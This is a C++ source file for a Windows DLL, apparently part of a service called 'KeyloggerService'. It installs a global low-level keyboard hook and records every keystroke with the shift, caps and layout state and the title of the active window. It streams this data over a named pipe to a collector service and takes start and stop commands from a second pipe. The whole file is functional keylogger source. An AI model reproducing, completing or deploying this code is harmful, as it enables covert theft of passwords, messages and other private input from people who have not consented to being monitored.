#include <Windows.h>
#include <vector>
#include <thread>
#include <defines.h>
#include <fstream>
#include <sstream>
#include <iostream>
#include <AccCtrl.h>
#include <AclAPI.h>
#include <filesystem>

HANDLE hEvent;
HANDLE hThread;
HANDLE hookThread;
HHOOK g_hHook;
HANDLE writePipe;
HANDLE hPipe;
HMODULE gModule;

std::atomic<bool> stopFlag(false);
std::atomic<bool> stopCallback(false);

std::wstring appDataDir = L"";
std::wstring logDir = L"";
std::wstring dllPipe = L"";
std::wstring servicePipe = L"";

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam);
DWORD WINAPI createHookProcess(LPVOID lpParam);

bool readStringValueFromRegistry(const std::wstring& subkey, const std::wstring& valueName, std::wstring& result) {
    HKEY hKey;
    LONG status = RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey.c_str(), 0, KEY_READ, &hKey);
    if (status != ERROR_SUCCESS) {
        std::cerr << "RegOpenKeyExW failed. Error: " << status << std::endl;
        return false;
    }

    DWORD dataType;
    DWORD dataSize;
    status = RegQueryValueExW(hKey, valueName.c_str(), NULL, &dataType, NULL, &dataSize);
    if (status != ERROR_SUCCESS || dataType != REG_SZ) {
        std::cerr << "RegQueryValueExW failed. Error: " << status << std::endl;
        RegCloseKey(hKey);
        return false;
    }

    result.resize(dataSize / sizeof(wchar_t));
    status = RegQueryValueExW(hKey, valueName.c_str(), NULL, NULL, reinterpret_cast<LPBYTE>(&result[0]), &dataSize);
    if (status != ERROR_SUCCESS) {
        std::cerr << "RegQueryValueExW failed. Error: " << status << std::endl;
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    return true;
}

void printToLog(std::string data, std::string filename = "!HookDll.log") {
    //std::wofstream outFile(logDir + L"\\" + stringToWString(filename), std::ios_base::app);
    std::wofstream outFile("C:\\ProgramData\\KeyloggerService\\Logs\\!HookDll.log", std::ios_base::app);
    if (outFile.is_open()) {
        outFile << stringToWString(data) << std::endl;
    }
    outFile.close();
}
void Stop()
{
    //stopFlag = true;
    //CancelIo(hPipe);
    if (g_hHook)UnhookWindowsHookEx(g_hHook);
    if (!TerminateThread(hThread, 1))
    {
        printToLog("Failed to terminate thread : % lu\n");
    }

    // Закройте дескриптор потока
    CloseHandle(hThread);
    //SetEvent(hEvent);
    //FreeLibrary(gModule);
}

void Start()
{
    hookThread = CreateThread(NULL, 0, createHookProcess, NULL, 0, NULL);
    printToLog("Hook process created", "!DllMain.log");
    if (hookThread != NULL) {
        printToLog("Server thread started", "!DllMain.log");
    }
}

DWORD WINAPI readCommandThread(LPVOID lpThreadParameter)
{
    SECURITY_ATTRIBUTES sa;
    DWORD dwRead = 1;
    DWORD error;
    COMMTIMEOUTS timeouts;
    TCHAR szBuffer[BUFSIZ + 1];
    bool startFlag = false;

    HANDLE evt = (HANDLE)lpThreadParameter;
    DWORD dwModeNoWait = PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_NOWAIT;
    DWORD dwModeWait = PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT;

    DWORD ret = EXIT_FAILURE;


    InitSecurityAttributes(&sa);

    hPipe = CreateNamedPipe(dllPipe.c_str(), PIPE_ACCESS_DUPLEX, dwModeWait,
        PIPE_UNLIMITED_INSTANCES, PAGE_SIZE, PAGE_SIZE, INFINITE, &sa);
    if (hPipe == INVALID_HANDLE_VALUE)
    {
        printToLog("[*] Failed to create named pipe(" + std::to_string(GetLastError()) + ")");
        goto _exit;
    }


    ZeroMemory(&timeouts, sizeof(COMMTIMEOUTS));
    timeouts.ReadTotalTimeoutConstant = 1000;
    SetCommTimeouts(hPipe, &timeouts);

    while (WaitForSingleObject(evt, 0) != WAIT_OBJECT_0 && dwRead != 0)
    {
        ConnectNamedPipe(hPipe, NULL);
        int i = GetLastError();
        if (i == ERROR_PIPE_CONNECTED)
        {
            printToLog("[*] Client connected");
            SetNamedPipeHandleState(hPipe, &dwModeWait, NULL, NULL);

            dwRead = 1;
            error = ERROR_SUCCESS;
            while (error != ERROR_BROKEN_PIPE && !stopFlag)
            {
                startFlag = true;
                dwRead = 0;

                char data[50];
                ReadFile(hPipe, &data, sizeof(data), &dwRead, NULL);

                if (std::string(data).find("stop") != std::string::npos) {
                    Stop();
                }
                else if (std::string(data).find("start") != std::string::npos) {
                    Start();
                }
                if (dwRead == 0)break;
                error = GetLastError();
            }
            printToLog("[*] Client disconnected");

            SetNamedPipeHandleState(hPipe, &dwModeNoWait, NULL, NULL);
            DisconnectNamedPipe(hPipe);
        }
        Sleep(100);
        dwRead = 1;
    }
    printToLog("[*] Server stopped");

    CloseHandle(hPipe);
    ret = EXIT_SUCCESS;
_exit:
    stopCallback = true;
    Stop();
    return ret;
}

void sendData(int keyLayout, int nCode, WPARAM wParam, LPARAM lParam) {
    //if (!writePipe)return;

    HWND window = GetForegroundWindow();
    const int MAX_TITLE_LENGTH = 1024;
    wchar_t title[MAX_TITLE_LENGTH];
    int length = GetWindowTextW(window, title, MAX_TITLE_LENGTH);

    /* std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
     std::string str = converter.to_bytes(title);*/

    int length2 = WideCharToMultiByte(CP_UTF8, 0, title, -1, NULL, 0, NULL, NULL);
    std::string str(length2, 0);
    WideCharToMultiByte(CP_UTF8, 0, title, -1, &str[0], length2, NULL, NULL);

    KBDLLHOOKSTRUCT* pKeyStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
    std::wstring result;

    bool shift = GetKeyState(VK_SHIFT) & 0x8000;
    bool capital = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

    KeyInfo info;
    info.lang = keyLayout;
    info.shift = shift;
    info.capital = capital;
    info.vkCode = pKeyStruct->vkCode;
    strcpy_s(info.title, str.c_str());
    info.window = window;

    std::size_t dataSize = sizeof(info);

    DWORD bytesWritten = 0;
    WriteFile(writePipe, &info, sizeof(info), &bytesWritten, NULL);
    if (bytesWritten != sizeof(info))
    {
        printToLog("Failed write structure size to named pipe: " + std::to_string(GetLastError()), "!SendData.log");
    }
    printToLog("Data sended to server", "!DllMain.log");
    //CloseHandle(writePipe);
}

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    printToLog("Triggered", "!Hookroc.log");
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        HWND window = GetForegroundWindow();
        HKL keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(window, NULL));
        int keyLayout = static_cast<int>(reinterpret_cast<uintptr_t>(keyboardLayout));
        printToLog("KeyCode: " + nCode, "!Hookroc.log");
        sendData(keyLayout, nCode, wParam, lParam);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

DWORD WINAPI createHookProcess(LPVOID lpParam)
{
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, NULL, 0);
    MSG message;
    if (g_hHook != NULL)
    {
        printToLog("SetWindowsHookEx created", "!DllMain.log");
        while (GetMessage(&message, NULL, 0, 0))
        {
            TranslateMessage(&message);
            DispatchMessage(&message);
        }
        return TRUE;
    }
    return FALSE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    bool a, b, c, d;
    std::wstring subkey;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        printToLog("DLL_PROCESS_ATTACH started", "!DllMain.log");
        //читаем конфиг из реестра 
        subkey = L"Software\\KeyloggerService\\config";
        a = readStringValueFromRegistry(subkey, L"logDir", logDir);
        b = readStringValueFromRegistry(subkey, L"appDataDir", appDataDir);
        c = readStringValueFromRegistry(subkey, L"dllPipe", dllPipe);
        d = readStringValueFromRegistry(subkey, L"servicePipe", servicePipe);

        if (!a || !b || !c || !d) {
            printToLog("Failed to open named pipe: " + GetLastError(), "!DllMain.log");
            return FALSE;
        }
        printToLog("Config red from registry", "!DllMain.log");
        // Создаем событие
        hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
        gModule = hModule;
        if (!writePipe) {
            writePipe = CreateFile(
                servicePipe.c_str(),
                GENERIC_WRITE,
                0,
                NULL,
                OPEN_EXISTING,
                0,
                NULL);
            printToLog("Pipe for conetion to Server created", "!DllMain.log");
            if (writePipe == INVALID_HANDLE_VALUE) {
                printToLog("Failed to open named pipe: " + GetLastError(), "!DllMain.log");
            }
        }

        hookThread = CreateThread(NULL, 0, createHookProcess, NULL, 0, NULL);;
        printToLog("Hook process created", "!DllMain.log");
        if (hookThread != NULL) {
            hThread = CreateThread(NULL, 0, readCommandThread, hEvent, 0, NULL);;
            printToLog("Server thread started", "!DllMain.log");
            if (hThread == NULL)
            {
                printToLog("Server thread not started", "!DllMain.log");
                UnhookWindowsHookEx(g_hHook);
                printToLog("Unhook", "!DllMain.log");
                return FALSE;
            }
        }
        else
        {
            if (g_hHook)UnhookWindowsHookEx(g_hHook);
            if (hEvent != NULL)CloseHandle(hEvent);
            if (hThread != NULL)CloseHandle(hThread);
            if (writePipe != NULL && writePipe != INVALID_HANDLE_VALUE) {
                CloseHandle(writePipe);
            }
            return FALSE;
        }
        break;
    case DLL_PROCESS_DETACH:
        // Сигнализируем потоку, что нужно завершить работу
        SetEvent(hEvent);

        // Ждем завершения потока
        WaitForSingleObject(hThread, INFINITE);

        // Закрываем дескриптор события и потока
        if (hEvent != NULL)CloseHandle(hEvent);
        if (hThread != NULL)CloseHandle(hThread);
        if (writePipe != NULL && writePipe != INVALID_HANDLE_VALUE) {
            CloseHandle(writePipe);
        }
        if (g_hHook)UnhookWindowsHookEx(g_hHook);
        FreeLibrary(hModule);
        break;
    }
    return TRUE;
}
